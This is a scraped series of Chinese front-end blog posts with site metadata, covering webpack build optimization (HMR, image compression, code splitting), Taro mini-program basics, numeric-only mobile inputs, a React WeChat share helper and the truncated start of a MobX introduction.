configs/webpack.base.js 1234567891011121314151617181920212223242526272829303132333435363738const path = require('path')const HtmlWebpackPlugin = require('html-webpack-plugin')module.exports = &#123; entry: './src/index.js', output: &#123; path: path.resolve(__dirname, '../dist'), filename: '[name].js', &#125;, module: &#123; rules: [ &#123; test: /\\.jsx?/, include: [ path.resolve(__dirname, '../src'), ], use: 'babel-loader', &#125;, &#123; test: /\\.(png|jpg|gif)$/, use: [ &#123; loader: 'file-loader' &#125;, ], &#125;, ], &#125;, plugins: [ new HtmlWebpackPlugin(&#123; filename: 'index.html', // 配置输出文件名和路径 template: 'src/index.html', // 配置文件模板 &#125;), ],&#125; configs/webpack.development.js 1234567891011121314151617181920212223242526272829303132333435363738394041const webpack = require('webpack')const merge = require('webpack-merge')const baseConfig = require('./webpack.base')const config = merge.smart(baseConfig, &#123; module: &#123; rules: [ &#123; enforce: 'pre', test: /\\.jsx?$/, exclude: /node_modules/, loader: \"eslint-loader\", &#125;, &#123; test: /\\.less$/, use: [ 'style-loader', 'css-loader', 'less-loader' ], &#125;, ], &#125;, devServer: &#123; port: '1234', before(app)&#123; app.get('/api/test.json', function(req, res) &#123; res.json(&#123; code: 200, message: 'hello world' &#125;) &#125;) &#125;, &#125;,&#125;)config.plugins.push( new webpack.DefinePlugin(&#123; __DEV__: JSON.stringify(true), &#125;))module.exports = config configs/webpack.production.js 1234567891011121314151617181920212223242526272829const merge = require('webpack-merge')const ExtractTextPlugin = require('extract-text-webpack-plugin')const baseConfig = require('./webpack.base')const config = merge.smart(baseConfig, &#123; module: &#123; rules: [ &#123; test: /\\.less$/, use: ExtractTextPlugin.extract(&#123; fallback: 'style-loader', use: [ &#123; loader: 'css-loader', options: &#123; minimize: true &#125; &#125;, 'less-loader', ], &#125;), &#125;, ], &#125;&#125;)config.plugins.push(new ExtractTextPlugin('[name].css'))module.exports = config 八、模块热替换提高开发效率 HMR 全称是 Hot Module Replacement，即模块热替换。在这个概念出来之前，我们使用过 Hot Reloading，当代码变更时通知浏览器刷新页面，以避免频繁手动刷新浏览器页面。HMR 可以理解为增强版的 Hot Reloading，但不用整个页面刷新，而是局部替换掉部分模块代码并且使其生效，可以看到代码变更后的效果。所以，HMR 既避免了频繁手动刷新页面，也减少了页面刷新时的等待，可以极大地提高前端页面开发效率… 8.1 配置使用 HMR HMR 是 webpack 提供的非常有用的一个功能，跟我们之前提到的一样，安装好 webpack-dev-server， 添加一些简单的配置，即在webpack 的配置文件中添加启用HMR需要的两个插件 12345678910111213const webpack = require('webpack')module.exports = &#123; // ... devServer: &#123; hot: true // dev server 的配置要启动 hot，或者在命令行中带参数开启 &#125;, plugins: [ // ... new webpack.NamedModulesPlugin(), // 用于启动 HMR 时可以显示模块的相对路径 new webpack.HotModuleReplacementPlugin(), // Hot Module Replacement 的插件 ],&#125;... 8.2 module.hot 常见的 API 前面 HMR实现部分已经讲解了实现 HMR 接口的重要性，下面来看看常见的 module.hot API 有哪些，以及如何使用 module.hot.accept 方法指定在应用特定代码模块更新时执行相应的 callback，第一个参数可以是字符串或者数组，如 12345if (module.hot) &#123; module.hot.accept(['./bar.js', './index.css'], () =&gt; &#123; // ... 这样当 bar.js 或者 index.css 更新时都会执行该函数 &#125;)&#125;... module.hot.decline 对于指定的代码模块，拒绝进行模块代码的更新，进入更新失败状态，如 module.hot.decline(&#39;./bar.js&#39;)。这个方法比较少用到 module.hot.dispose 用于添加一个处理函数，在当前模块代码被替换时运行该函数，例如 12345if (module.hot) &#123; module.hot.dispose((data) =&gt; &#123; // data 用于传递数据，如果有需要传递的数据可以挂在 data 对象上，然后在模块代码更新后可以通过 module.hot.data 来获取 &#125;)&#125;... module.hot.accept 通常用于指定当前依赖的某个模块更新时需要做的处理，如果是当前模块更新时需要处理的动作，使用 module.hot.dispose 会更加容易方便 module.hot.removeDisposeHandler用于移除 dispose 方法添加的 callback 九、图片加载优化9.1 CSS Sprites 如果你使用的 webpack 3.x 版本，需要 CSS Sprites 的话，可以使用 webpack-spritesmith 或者 sprite-webpack-plugin。 我们以 webpack-spritesmith 为例，先安装依赖… 12345678910111213141516171819202122232425262728module: &#123; loaders: [ // ... 这里需要有处理图片的 loader，如 file-loader ]&#125;,resolve: &#123; modules: [ 'node_modules', 'spritesmith-generated', // webpack-spritesmith 生成所需文件的目录 ],&#125;,plugins: [ new SpritesmithPlugin(&#123; src: &#123; cwd: path.resolve(__dirname, 'src/ico'), // 多个图片所在的目录 glob: '*.png' // 匹配图片的路径 &#125;, target: &#123; // 生成最终图片的路径 image: path.resolve(__dirname, 'src/spritesmith-generated/sprite.png'), // 生成所需 SASS/LESS/Stylus mixins 代码，我们使用 Stylus 预处理器做例子 css: path.resolve(__dirname, 'src/spritesmith-generated/sprite.styl'), &#125;, apiOptions: &#123; cssImageRef: \"~sprite.png\" &#125;, &#125;),],... 在你需要的样式代码中引入 sprite.styl 后调用需要的mixins 即可 123456@import &apos;~sprite.styl&apos;.close-button sprite($close).open-button sprite($open) 如果你使用的是 webpack 4.x，你需要配合使用 postcss和 postcss-sprites，才能实现 CSS Sprites 的相关构建 9.2 图片压缩 在一般的项目中，图片资源会占前端资源的很大一部分，既然代码都进行压缩了，占大头的图片就更不用说了 我们之前提及使用file-loader 来处理图片文件，在此基础上，我们再添加一个 image-webpack-loader来压缩图片文件。简单的配置如下… 12345678910111213141516171819202122232425262728293031323334353637module.exports = &#123; // ... module: &#123; rules: [ &#123; test: /.*\\.(gif|png|jpe?g|svg|webp)$/i, use: [ &#123; loader: 'file-loader', options: &#123;&#125; &#125;, &#123; loader: 'image-webpack-loader', options: &#123; mozjpeg: &#123; // 压缩 jpeg 的配置 progressive: true, quality: 65 &#125;, optipng: &#123; // 使用 imagemin-optipng 压缩 png，enable: false 为关闭 enabled: false, &#125;, pngquant: &#123; // 使用 imagemin-pngquant 压缩 png quality: '65-90', speed: 4 &#125;, gifsicle: &#123; // 压缩 gif 的配置 interlaced: false, &#125;, webp: &#123; // 开启 webp，会把 jpg 和 png 图片压缩为 webp 格式 quality: 75 &#125;, &#125;, ], &#125;, ], &#125;,&#125;... 9.3 使用 DataURL 有的时候我们的项目中会有一些很小的图片，因为某些缘故并不想使用 CSS Sprites 的方式来处理（譬如小图片不多，因此引入 CSS Sprites 感觉麻烦），那么我们可以在 webpack 中使用 url-loader 来处理这些很小的图片… url-loader 和 file-loader 的功能类似，但是在处理文件的时候，可以通过配置指定一个大小，当文件小于这个配置值时，url-loader 会将其转换为一个 base64 编码的 DataURL，配置如下 123456789101112131415161718module.exports = &#123; // ... module: &#123; rules: [ &#123; test: /\\.(png|jpg|gif)$/, use: [ &#123; loader: 'url-loader', options: &#123; limit: 8192, // 单位是 Byte，当文件小于 8KB 时作为 DataURL 处理 &#125;, &#125;, ], &#125;, ], &#125;,&#125;... 9.4 代码压缩 webpack 4.x 版本运行时，mode 为 production 即会启动压缩 JS 代码的插件，而对于 webpack 3.x，使用压缩 JS 代码插件的方式也已经介绍过了。在生产环境中，压缩 JS 代码基本是一个必不可少的步骤，这样可以大大减小 JavaScript 的体积，相关内容这里不再赘述。 除了 JS 代码之外，我们一般还需要 HTML 和 CSS 文件，这两种文件也都是可以压缩的，虽然不像 JS 的压缩那么彻底（替换掉长变量等），只能移除空格换行等无用字符，但也能在一定程度上减小文件大小。在 webpack 中的配置使用也不是特别麻烦，所以我们通常也会使用。 对于 HTML 文件，之前介绍的 html-webpack-plugin 插件可以帮助我们生成需要的 HTML 并对其进行压缩… 12345678910111213module.exports = &#123; // ... plugins: [ new HtmlWebpackPlugin(&#123; filename: 'index.html', // 配置输出文件名和路径 template: 'assets/index.html', // 配置文件模板 minify: &#123; // 压缩 HTML 的配置 minifyCSS: true, // 压缩 HTML 中出现的 CSS 代码 minifyJS: true // 压缩 HTML 中出现的 JS 代码 &#125; &#125;), ],&#125;... 如上，使用 minify 字段配置就可以使用 HTML 压缩，这个插件是使用 html-minifier 来实现HTML 代码压缩的，minify下的配置项直接透传给 html-minifier，配置项参考 html-minifier 文档即可。 对于 CSS 文件，我们之前介绍过用来处理 CSS 文件的 css-loader，也提供了压缩 CSS 代码的功能：… 12345678910111213141516171819202122module.exports = &#123; module: &#123; rules: [ // ... &#123; test: /\\.css/, include: [ path.resolve(__dirname, 'src'), ], use: [ 'style-loader', &#123; loader: 'css-loader', options: &#123; minimize: true, // 使用 css 的压缩功能 &#125;, &#125;, ], &#125;, ], &#125;&#125;... 在 css-loader 的选项中配置 minimize 字段为 true来使用CSS 压缩代码的功能。css-loader 是使用 cssnano来压缩代码的，minimize 字段也可以配置为一个对象，来将相关配置传递给 cssnano… 十、分离代码文件 关于分离 CSS 文件这个主题，之前在介绍如何搭建基本的前端开发环境时有提及，在 webpack 中使用 extract-text-webpack-plugin 插件即可。 先简单解释一下为何要把 CSS 文件分离出来，而不是直接一起打包在 JS 中。最主要的原因是我们希望更好地利用缓存。 假设我们原本页面的静态资源都打包成一个 JS 文件，加载页面时虽然只需要加载一个 JS 文件，但是我们的代码一旦改变了，用户访问新的页面时就需要重新加载一个新的 JS 文件。有些情况下，我们只是单独修改了样式，这样也要重新加载整个应用的 JS 文件，相当不划算。 还有一种情况是我们有多个页面，它们都可以共用一部分样式（这是很常见的，CSS Reset、基础组件样式等基本都是跨页面通用），如果每个页面都单独打包一个 JS 文件，那么每次访问页面都会重复加载原本可以共享的那些 CSS 代码。如果分离开来，第二个页面就有了 CSS 文件的缓存，访问速度自然会加快。虽然对第一个页面来说多了一个请求，但是对随后的页面来说，缓存带来的速度提升相对更加可观… 3.x 以前的版本是使用 CommonsChunkPlugin 来做代码分离的，而 webpack 4.x 则是把相关的功能包到了optimize.splitChunks 中，直接使用该配置就可以实现代码分离。 10.1 webpack 4.x 的 optimization123456789module.exports = &#123; // ... webpack 配置 optimization: &#123; splitChunks: &#123; chunks: \"all\", // 所有的 chunks 代码公共的部分分离出来成为一个单独的文件 &#125;, &#125;,&#125;... 我们需要在 HTML 中引用两个构建出来的 JS 文件，并且 commons.js 需要在入口代码之前。下面是个简单的例子 12&lt;script src=\"commons.js\" charset=\"utf-8\"&gt;&lt;/script&gt;&lt;script src=\"entry.bundle.js\" charset=\"utf-8\"&gt;&lt;/script&gt; 如果你使用了 html-webpack-plugin，那么对应需要的 JS 文件都会在 HTML 文件中正确引用，不用担心。如果没有使用，那么你需要从 stats 的 entrypoints 属性来获取入口应该引用哪些 JS 文件，可以参考 Node API 了解如何从 stats 中获取信息… 显式配置共享类库可以这么操作 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950module.exports = &#123; entry: &#123; vendor: [\"react\", \"lodash\", \"angular\", ...], // 指定公共使用的第三方类库 &#125;, optimization: &#123; splitChunks: &#123; cacheGroups: &#123; vendor: &#123; chunks: \"initial\", test: \"vendor\", name: \"vendor\", // 使用 vendor 入口作为公共部分 enforce: true, &#125;, &#125;, &#125;, &#125;, // ... 其他配置&#125;// 或者module.exports = &#123; optimization: &#123; splitChunks: &#123; cacheGroups: &#123; vendor: &#123; test: /react|angluar|lodash/, // 直接使用 test 来做路径匹配 chunks: \"initial\", name: \"vendor\", enforce: true, &#125;, &#125;, &#125;, &#125;,&#125;// 或者module.exports = &#123; optimization: &#123; splitChunks: &#123; cacheGroups: &#123; vendor: &#123; chunks: \"initial\", test: path.resolve(__dirname, \"node_modules\") // 路径在 node_modules 目录下的都作为公共部分 name: \"vendor\", // 使用 vendor 入口作为公共部分 enforce: true, &#125;, &#125;, &#125;, &#125;,&#125;... 上述第一种做法是显示指定哪些类库作为公共部分，第二种做法实现的功能差不多，只是利用了 test 来做模块路径的匹配，第三种做法是把所有在 node_modules 下的模块，即作为依赖安装的，都作为公共部分。你可以针对项目情况，选择最合适的做法.. 10.2 webpack 3.x 的 CommonsChunkPlugin webpack 3.x以下的版本需要用到 webpack 自身提供的 CommonsChunkPlugin 插件。我们先来看一个最简单的例子 12345678910module.exports = &#123; // ... plugins: [ new webpack.optimize.CommonsChunkPlugin(&#123; name: \"commons\", // 公共使用的 chunk 的名称 filename: \"commons.js\", // 公共 chunk 的生成文件名 minChunks: 3, // 公共的部分必须被 3 个 chunk 共享 &#125;), ],&#125;... chunk 在这里是构建的主干，可以简单理解为一个入口对应一个 chunk。 以上插件配置在构建后会生成一个 commons.js 文件，该文件就是代码中的公共部分。上面的配置中 minChunks字段为 3，该字段的意思是当一个模块被 3 个以上的 chunk 依赖时，这个模块就会被划分到 commons chunk 中去。单从这个配置的角度上讲，这种方式并没有 4.x 的 chunks: &quot;all&quot;那么方便。 CommonsChunkPlugin 也是支持显式配置共享类库的 123456789101112131415module.exports = &#123; entry: &#123; vendor: ['react', 'react-redux'], // 指定公共使用的第三方类库 app: './src/entry', // ... &#125;, // ... plugins: [ new webpack.optimize.CommonsChunkPlugin(&#123; name: 'vendor' // 使用 vendor 入口作为公共部分 filename: \"vendor.js\", minChunks: Infinity, // 这个配置会让 webpack 不再自动抽离公共模块 &#125;), ],&#125;... 上述配置会生成一个名为 vendor.js 的共享代码文件，里面包含了 React 和React-Redux 库的代码，可以提供给多个不同的入口代码使用。这里的 minChunks 字段的配置，我们使用了 Infinity，可以理解为webpack 不自动抽离公共模块。如果这里和之前一样依旧设置为 3，那么被 3 个以上的chunk依赖的模块会和 React、React-Redux 一同打包进 vendor，这样就失去显式指定的意义了。 minChunks其实还可以是一个函数，如： 1234minChunks: (module, count) =&gt; &#123; console.log(module, count); return true;&#125;, 该函数在分析每一个依赖的时候会被调用，传入当前依赖模块的信息 module，以及已经被作为公共模块的数量 count，你可以在函数中针对每一个模块做更加精细化的控制。看一个简单的例子： 1234minChunks: (module, count) =&gt; &#123; return module.context &amp;&amp; module.context.includes(\"node_modules\"); // node_modules 目录下的模块都作为公共部分，效果就如同 webpack 4.x 中的 test: path.resolve(__dirname, \"node_modules\")&#125;, 更多使用 CommonsChunkPlugin的配置参考官方文档 commons-chunk-plugin。 十一、进一步控制JS大小11.1 按需加载模块 在 webpack 的构建环境中，要按需加载代码模块很简单，遵循 ES 标准的动态加载语法 dynamic-import 来编写代码即可，webpack 会自动处理使用该语法编写的模块 12345// import 作为一个方法使用，传入模块名即可，返回一个 promise 来获取模块暴露的对象// 注释 webpackChunkName: \"lodash\" 可以用于指定 chunk 的名称，在输出文件时有用import(/* webpackChunkName: \"lodash\" */ 'lodash').then((_) =&gt; &#123; console.log(_.lash([1, 2, 3])) // 打印 3&#125;)... 注意一下，如果你使用了 Babel 的话，还需要 Syntax Dynamic Import 这个 Babel 插件来处理 import() 这种语法。 由于动态加载代码模块的语法依赖于 promise，对于低版本的浏览器，需要添加 promise 的 polyfill 后才能使用。 如上的代码，webpack 构建时会自动把 lodash 模块分离出来，并且在代码内部实现动态加载 lodash 的功能。动态加载代码时依赖于网络，其模块内容会异步返回，所以 import 方法是返回一个 promise 来获取动态加载的模块内容。 import 后面的注释 webpackChunkName: &quot;lodash&quot; 用于告知 webpack所要动态加载模块的名称。我们在 webpack 配置中添加一个 output.chunkFilename 的配置… 12345output: &#123; path: path.resolve(__dirname, 'dist'), filename: '[name].[hash:8].js', chunkFilename: '[name].[hash:8].js' // 指定分离出来的代码文件的名称&#125;,... 这样就可以把分离出来的文件名称用 lodash 标识了，如下图： image.png 如果没有添加注释 webpackChunkName: &quot;lodash&quot; 以及 output.chunkFilename 配置，那么分离出来的文件名称会以简单数字的方式标识，不便于识别 11.2 以上完整示例代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101const path = require('path')const webpack = require('webpack')const HtmlWebpackPlugin = require('html-webpack-plugin')const ExtractTextPlugin = require('extract-text-webpack-plugin')module.exports = &#123; entry: './src/index.js', output: &#123; path: path.resolve(__dirname, 'dist'), filename: '[name].js', &#125;, module: &#123; rules: [ &#123; test: /\\.jsx?/, include: [ path.resolve(__dirname, 'src'), ], use: 'babel-loader', &#125;, &#123; test: /\\.less$/, use: ExtractTextPlugin.extract(&#123; fallback: 'style-loader', use: [ 'css-loader', 'postcss-loader', 'less-loader', ], &#125;), &#125;, &#123; test: /\\.(png|jpg|gif)$/, use: [ &#123; loader: 'url-loader', options: &#123; limit: 8192 &#125;, &#125;, &#123; loader: 'image-webpack-loader', options: &#123; mozjpeg: &#123; // 压缩 jpeg 的配置 progressive: true, quality: 65 &#125;, optipng: &#123; // 使用 imagemin-optipng 压缩 png，enable: false 为关闭 enabled: false, &#125;, pngquant: &#123; // 使用 imagemin-pngquant 压缩 png quality: '65-90', speed: 4 &#125;, gifsicle: &#123; // 压缩 gif 的配置 interlaced: false, &#125;, webp: &#123; // 开启 webp，会把 jpg 和 png 图片压缩为 webp 格式 quality: 75 &#125;, &#125;, &#125;, ], &#125;, ], &#125;, optimization: &#123; splitChunks: &#123; cacheGroups: &#123; vendor: &#123; chunks: \"initial\", test: path.resolve(__dirname, \"node_modules\"), // 路径在 node_modules 目录下的都作为公共部分 name: \"vendor\", // 使用 vendor 入口作为公共部分 enforce: true, &#125;, &#125;, &#125;, &#125;, plugins: [ new HtmlWebpackPlugin(&#123; filename: 'index.html', // 配置输出文件名和路径 template: 'src/index.html', // 配置文件模板 minify: &#123; // 压缩 HTML 的配置 minifyCSS: true, // 压缩 HTML 中出现的 CSS 代码 minifyJS: true, // 压缩 HTML 中出现的 JS 代码 removeComments: true, &#125;, &#125;), new ExtractTextPlugin('[name].css'), new webpack.NamedModulesPlugin(), new webpack.HotModuleReplacementPlugin(), ], devServer: &#123; hot: true &#125;&#125;","categories":[{"name":"Build","slug":"Build","permalink":"https://ru23.com/categories/Build/"}],"tags":[{"name":"webpack","slug":"webpack","permalink":"https://ru23.com/tags/webpack/"}]},{"title":"Taro开发小程序体验","slug":"2018-09-wx-taro","date":"2018-09-03T11:30:43.000Z","updated":"2018-10-24T03:46:03.315Z","comments":true,"path":"note/70e88573.html","link":"","permalink":"https://ru23.com/note/70e88573.html","excerpt":"","text":"一、初识Taro1.1 优点 小程序中无法使用 npm 来进行第三方库的管理，无法使用一些比较新的 ES 规范等等，针对小程序端的开发弊端，Taro 具有以下的优秀特性 支持使用 npm/yarn 安装管理第三方依赖。 支持使用 ES7/ES8 甚至更加新的 ES 规范，一切都可自行配置 支持使用 CSS 预编译器，例如 Sass 等 支持使用 Redux 进行状态管理 小程序 API 优化，异步 API Promise 化等 1.2 快速开始 微信小程序编译预览模式 123456# npm script$ npm run dev:weapp# 仅限全局安装$ taro build --type weapp --watch# npx用户也可以使用$ npx taro build --type weapp --watch H5 编译预览模式 123456# npm script$ npm run dev:h5# 仅限全局安装$ taro build --type h5 --watch# npx用户也可以使用$ npx taro build --type h5 --watch RN 编译预览模式 123456# npm script$ npm run dev:rn# 仅限全局安装$ taro build --type rn --watch# npx用户也可以使用$ npx taro build --type rn --watch 目录结构 12345678910111213├── dist 编译结果目录├── config 配置目录| ├── dev.js 开发时配置| ├── index.js 默认配置| └── prod.js 打包时配置├── src 源码目录| ├── pages 页面文件目录| | ├── index index页面目录| | | ├── index.js index页面逻辑| | | └── index.css index页面样式| ├── app.css 项目总通用样式| └── app.js 项目入口文件└── package.json 进入项目目录开始开发，可以选择小程序预览模式，或者h5预览模式，若使用微信小程序预览模式，则需要自行下载并打开微信开发者工具，选择预览项目根目录 注意 需要设置关闭ES6转ES5功能，开启可能报错 需要设置关闭上传代码时样式自动补全，开启可能报错 需要设置关闭代码压缩上传，开启可能报错 1.3 语法风格 Taro 的语法规则基于 React 规范，它采用与 React 一致的组件化思想，组件生命周期与 React 保持一致，同时在书写体验上也尽量与 React 类似，支持使用 JSX 语法 一个普通的入口文件示例如下app.js 123456789101112131415161718192021222324252627282930313233import Taro, &#123; Component &#125; from '@tarojs/taro'import Index from './pages/index'import './app.scss'class App extends Component &#123; // 项目配置 config = &#123; pages: [ 'pages/index/index' ], window: &#123; backgroundTextStyle: 'light', navigationBarBackgroundColor: '#fff', navigationBarTitleText: 'WeChat', navigationBarTextStyle: 'black' &#125; &#125; componentWillMount () &#123;&#125; componentDidMount () &#123;&#125; componentDidShow () &#123;&#125; componentDidHide () &#123;&#125; render () &#123; return ( &lt;Index /&gt; ) &#125;&#125; 二、生命周期函数App.js生命周期 生命周期方法 作用 说明 componentWillMount 程序被载入 对应微信小程序onLaunch componentDidMount 程序被载入 对应微信小程序onLaunch，在componentWillMount之后执行 componentDidShow 程序展示出来 对应微信小程序onShow componentDidHide 程序被隐藏 对应微信小程序onHide 不过当然也包含componentWillUnmout和componentWillReceiveProps等react原始生命周期函数，用来编写自定义组件 页面生命周期 生命周期方法 作用 说明 componentWillMount 页面被载入 在微信小程序中这一生命周期方法对应 onLoad componentDidMount 页面渲染完成 在微信小程序中这一生命周期方法对应 onReady shouldComponentUpdate 页面是否需要更新 componentWillUpdate 页面即将更新 componentDidUpdate 页面更新完毕 componentWillUnmount 页面退出 在微信小程序中这一生命周期方法对应 onUnload componentDidShow 页面展示出来 在微信小程序中这一生命周期方法对应onShow，在H5中同样实现 componentDidHide 页面被隐藏 在微信小程序中这一生命周期方法对应 onHide，在H5中同样实现 微信小程序中 onLoad 通常带有一个参数 options，在 Taro 中你可以在所有生命周期方法中通过 this.$router.params访问到，在其他端也适用 三、路由 我们只需要在入口文件的 config配置中指定好 pages，然后就可以在代码中通过Taro 提供的 API 来跳转到目的页面，例如 123456789// 跳转到目的页面，打开新页面Taro.navigateTo(&#123; url: '/pages/page/path/name'&#125;)// 跳转到目的页面，在当前页面打开Taro.redirectTo(&#123; url: '/pages/page/path/name'&#125;) 传参 我们可以通过在所有跳转的 url 后面添加查询字符串参数进行跳转传参，例如 1234// 传入参数 id=2&amp;type=testTaro.navigateTo(&#123; url: '/pages/page/path/name?id=2&amp;type=test'&#125;) 这样的话，在跳转成功的目标页的生命周期方法里就能通过 this.$router.params 获取到传入的参数，例如上述跳转，在目标页的 componentWillMount 生命周期里获取入参 12345class C extends Taro.Component &#123; componentWillMount () &#123; console.log(this.$router.params) // 输出 &#123; id: 2, type: 'test' &#125; &#125;&#125; 四、专属的方法 在小程序中，页面还有在一些专属的方法成员，如下 方法 作用 onPullDownRefresh 页面相关事件处理函数–监听用户下拉动作 onReachBottom 页面上拉触底事件的处理函数 onShareAppMessage 用户点击右上角转发 onPageScroll 页面滚动触发事件的处理函数 onTabItemTap 当前是 tab 页时，点击 tab 时触发 以上成员方案在 Taro 的页面中同样可以使用，书写同名方法即可，不过需要注意的，目前暂时只有微信小程序端支持这些方法，编译到H5端后这些方法均会失效 五、更多参考 Taro文档 Taro-UI 一文看懂，支撑京东核心业务小程序的统一开发框架「Taro」","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"小程序","slug":"小程序","permalink":"https://ru23.com/tags/小程序/"},{"name":"Taro","slug":"Taro","permalink":"https://ru23.com/tags/Taro/"}]},{"title":"移动端限制input框只能输入数字","slug":"2018-09-移动端限制input框只能输入数字","date":"2018-09-03T08:56:58.000Z","updated":"2018-10-24T03:46:03.331Z","comments":true,"path":"note/bef00dcb.html","link":"","permalink":"https://ru23.com/note/bef00dcb.html","excerpt":"","text":"html5 中，input 的 type 属性规定 input 元素的类型。1&lt;input type=\"value\"&gt; 有很多选项，详细可以参考HTML 5 type 属性 但是在移动端，还要区分是安卓用户，还是ios用户，所以这样写： 1&lt;input class=\"num_input\" type='number' pattern=\"[0-9]*\"/&gt; 在安卓端设置input类型为number，可限制键盘只输入数字，在ios端，要加入pattern验证输入字段的模式，才能限制数字输入。 另： autofocus=&quot;autofocus&quot;可以自动对焦。","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"html5","slug":"html5","permalink":"https://ru23.com/tags/html5/"}]},{"title":"React Js 微信分享封装","slug":"2018-09-React-Js-微信分享封装","date":"2018-09-03T07:17:54.000Z","updated":"2018-10-24T03:46:02.623Z","comments":true,"path":"note/73d22f41.html","link":"","permalink":"https://ru23.com/note/73d22f41.html","excerpt":"","text":"Introductions本篇文章给大家分享的内容是代码详解React Js 微信分享封装，有着一定的参考价值，有需要的朋友可以参考一下 话不多说，直接上源代码： Quick Start分享功能123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116import Fetch from './FetchIt';import API_URL from './url';import Share from './Share';let wxUtils = &#123;&#125;;////////////////////////////////////////////////////////////////////////////////////////// 分享/////////////////////////////////////////////////////////////////////////////////////////** getshareinfo?type= type :goods 课程详情 team 团详情 id 课程id tid 团ID * @param config * @param shareInfo &#123;imgUrl,title,description,link&#125; */function share2wx(config, shareInfo) &#123; const share = new Share(&#123; appid: config.appid, // 必填，公众号的唯一标识 timestamp: config.timestamp, // 必填，生成签名的时间戳 nonceStr: config.nonceStr, // 必填，生成签名的随机串 signature: config.signature, // 必填，签名 &#125;); share.init(Object.assign(&#123;&#125;, shareInfo));&#125;function getConfig(shareInfo) &#123; let href = window.location.href.split('#')[0]; const url = encodeURIComponent(href /*window.location.href*/); Fetch.get(`$&#123;API_URL.mobile.signature_path&#125;?url=$&#123;url&#125;`).then(data =&gt; &#123; share2wx(data, shareInfo); &#125;);&#125;/** * @param shareInfo */wxUtils.share = function (shareInfo) &#123; getConfig(shareInfo);&#125;;////////////////////////////////////////////////////////////////////////////////////////// 分享结束/////////////////////////////////////////////////////////////////////////////////////////** * 是否开启右上角Menu * @param open */wxUtils.optionMenu = function (open = true) &#123; if (open) &#123; openOptionMenu(); &#125; else &#123; disabledOptionMenu(); &#125;&#125;;/** * 是否禁用右上角 */function disabledOptionMenu() &#123; if (typeof WeixinJSBridge === \"undefined\") &#123; if (document.addEventListener) &#123; document.addEventListener('WeixinJSBridgeReady', onBridgeReady(true), false); &#125; else if (document.attachEvent) &#123; document.attachEvent('WeixinJSBridgeReady', onBridgeReady(true)); document.attachEvent('onWeixinJSBridgeReady', onBridgeReady(true)); &#125; &#125; else &#123; onBridgeReady(true); &#125;&#125;/** * 开启menu */function openOptionMenu() &#123; if (typeof WeixinJSBridge === \"undefined\") &#123; if (document.addEventListener) &#123; document.addEventListener('WeixinJSBridgeReady', onBridgeReady(false), false); &#125; else if (document.attachEvent) &#123; document.attachEvent('WeixinJSBridgeReady', onBridgeReady(false)); document.attachEvent('onWeixinJSBridgeReady', onBridgeReady(false)); &#125; &#125; else &#123; onBridgeReady(false); &#125;&#125;function onBridgeReady(disable = true) &#123; if (typeof WeixinJSBridge !== \"undefined\") WeixinJSBridge.call(disable ? 'hideOptionMenu' : 'showOptionMenu');&#125;/** * 隐藏微信网页底部的导航栏 * @param disable */wxUtils.disabledToolbar = function (disable = true) &#123; document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() &#123; // 通过下面这个API隐藏底部导航栏 WeixinJSBridge.call(disable ? 'hideToolbar' : 'showToolbar'); &#125;);&#125;;export default wxUtils; 分享配置12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// 分享function Share(config) &#123; wx.config(&#123; debug: false, // 开启调试模式 appId: config.appid, // 必填，公众号的唯一标识 timestamp: config.timestamp, // 必填，生成签名的时间戳 nonceStr: config.nonceStr, // 必填，生成签名的随机串 signature: config.signature, // 必填，签名，见附录1 jsApiList: ['onMenuShareTimeline', 'onMenuShareAppMessage', 'onMenuShareWeibo'], // 必填，需要使用的JS接口列表，所有JS接口列表见附录2 &#125;);&#125;Share.prototype = &#123; constructor: Share, init(config) &#123; this.imgUrl = config.imgUrl; this.link = config.link; // this.musicPath = config.musicPath; this.description = config.description; this.title = config.title; wx.ready(() =&gt; &#123; // if (this.musicPath) &#123; // document.getElementById('musicIcon').play(); // &#125; this.toFriend(); this.toTimeline(); &#125;); wx.error(res =&gt; &#123; console.log(`$&#123;res&#125;`); &#125;); &#125;, toFriend() &#123; wx.onMenuShareAppMessage(&#123; imgUrl: this.imgUrl, link: this.link, title: this.title, desc: this.description, success: function () &#123; // 用户确认分享后执行的回调函数 &#125;, &#125;); &#125;, toTimeline() &#123; wx.onMenuShareTimeline(&#123; imgUrl: this.imgUrl, link: this.link, title: this.title, desc: this.description, success: function () &#123; // 用户确认分享后执行的回调函数 &#125;, &#125;); &#125;,&#125;;export default Share; 开启分享12345678//开启分享BaseComponent.wxUtils.optionMenu(true);BaseComponent.wxUtils.share(&#123; imgUrl: activityData.sharePicUrl, title: activityData.shareTitle, description: activityData.shareContent, link: url,&#125;);","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"初识MobX","slug":"2017-01-acq-mobx","date":"2018-08-31T08:25:24.000Z","updated":"2018-10-24T03:46:02.047Z","comments":true,"path":"note/a5647f53.html","link":"","permalink":"https://ru23.com/note/a5647f53.html","excerpt":"","text":"一、认识MobX 打印mobx，看看mobx中有什么 mobx MobX的整个流程 MobX 和 Redux 的比较 Redux 是单一数据源，而 MobX 往往是多个 store。MobX 可以根据应用的 UI、数据或业务逻辑来组织 store，具体如何进行需要你自己进行权衡 Redux store 使用普通的 JavaScript 对象结构，MobX 将常规 JavaScript 对象包裹，赋予 observable 的能力，通过隐式订阅，自动跟踪 observable 的变化。MobX 是观察引用的，在跟踪函数中（例如：computed value、reactions等等），任何被引用的 observable 的属性都会被记录，一旦引用改变，MobX 将作出反应。注意，不在跟踪函数中的属性将不会被跟踪，在异步中访问的属性也不会被跟踪 Redux 的 state 是只读的，只能通过将之前的 state 与触发的 action 结合，产生新的 state，因此是纯净的（pure）。而 MobX 的 state 即可读又可写，action 是非必须的，可以直接赋值改变，因此是不纯净的（Impure） Redux 需要你去规范化你的 state，Immutable 数据使 Reducer 